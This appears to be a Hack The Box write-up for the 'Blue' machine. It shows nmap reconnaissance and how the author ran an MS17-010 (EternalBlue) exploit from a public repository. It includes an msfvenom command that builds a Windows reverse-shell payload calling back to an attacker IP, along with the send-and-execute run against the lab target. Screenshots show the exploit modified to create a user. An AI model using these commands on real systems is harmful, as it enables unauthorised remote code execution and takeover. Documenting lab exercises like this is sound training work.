# Blue Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA blue 10.10.10.40``

### and

``nmap --script vuln 10.10.10.40``

# ${{\color{purple}Initial Foothold}}\ $

![image](https://user-images.githubusercontent.com/123066149/219156029-61007f6c-1d63-4c56-80c3-b0b229a7d281.png)

# ${{\color{purple}Exploitation}}\ $

### I used this script to run ms-17-010 :
### The most important thing here is not the exploitation but to make a python2 script work with impacket

https://github.com/k4u5h41/MS17-010_CVE-2017-0143

``git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143``

### There is no need for it for this exploit but the pipes checker works very well :

![blue2](https://user-images.githubusercontent.com/123066149/219165990-17752e32-6dfb-4b7a-ba59-a86b0c56e03f.PNG)


``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 -f exe -o ms17-010.exe``

### Change the username to make it work in the exploit 

![image](https://user-images.githubusercontent.com/123066149/219158101-530f4d9d-5ed4-409d-bed3-a0a82bc165cf.png)

``python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe``

![image](https://user-images.githubusercontent.com/123066149/219158641-ace89ab3-225a-4e79-ba19-8d81347e8ca5.png)

![image](https://user-images.githubusercontent.com/123066149/219158807-4134bd30-2ed5-4c02-87f4-583882b6c2e3.png)

# ${{\color{purple}Privilege Escalation}}\ $

### No priv esc because the service runs with system rights

# ${{\color{purple}Point of Improvement}}\ $

* If I have problems with a python 2.7 script and impacket I have to do this :

``sudo python2.7 get-pip.py``

``pip2.7 install --upgrade setuptools``

``pip install impacket==0.9.22``

![image](https://user-images.githubusercontent.com/123066149/219160110-72dbd5b9-e8ee-4af8-8199-40a5f749e80d.png)

# ${{\color{purple}Other tets}}\ $

### Test of the exploit 42315.py

![blue5](https://user-images.githubusercontent.com/123066149/219174901-f68feb19-1549-4097-9ab6-607db3c29aed.PNG)

### Modification of the smb_pwn function :


![blue6](https://user-images.githubusercontent.com/123066149/219175013-27ec2f1f-a6fb-4c60-bdb4-2746fe0f8148.PNG)

![blue3](https://user-images.githubusercontent.com/123066149/219174727-b487e88a-d945-4456-9884-305f928f8c65.PNG)

![blue4](https://user-images.githubusercontent.com/123066149/219174912-019f1ad4-3c07-4b43-b391-8980728eb7e6.PNG)


### Test of the RCE via ping and tcpdump :
### Modification of the smb_pwn function :

![blue7](https://user-images.githubusercontent.com/123066149/219175311-5ce854fc-0d1f-457c-996c-36249ec33e08.PNG)

![blue8](https://user-images.githubusercontent.com/123066149/219175336-9aebc130-0d4a-4ed1-a735-565f91dccbd8.PNG)

![blue9](https://user-images.githubusercontent.com/123066149/219175351-95653981-f62b-4ba5-89b2-d56efd2481d6.PNG)

### Creation of a user evil :
### Modification of the smb_pwn function :

![blue10](https://user-images.githubusercontent.com/123066149/219175537-e3b8f7f7-c0c0-4286-a445-04eaef3ea009.PNG)

![blue12](https://user-images.githubusercontent.com/123066149/219175605-eb354ce2-2f86-415f-a3ca-87edbd8fc66e.PNG)


![blue11](https://user-images.githubusercontent.com/123066149/219175576-d12f11e8-37ac-4586-9b12-b4b42b6c480f.PNG)


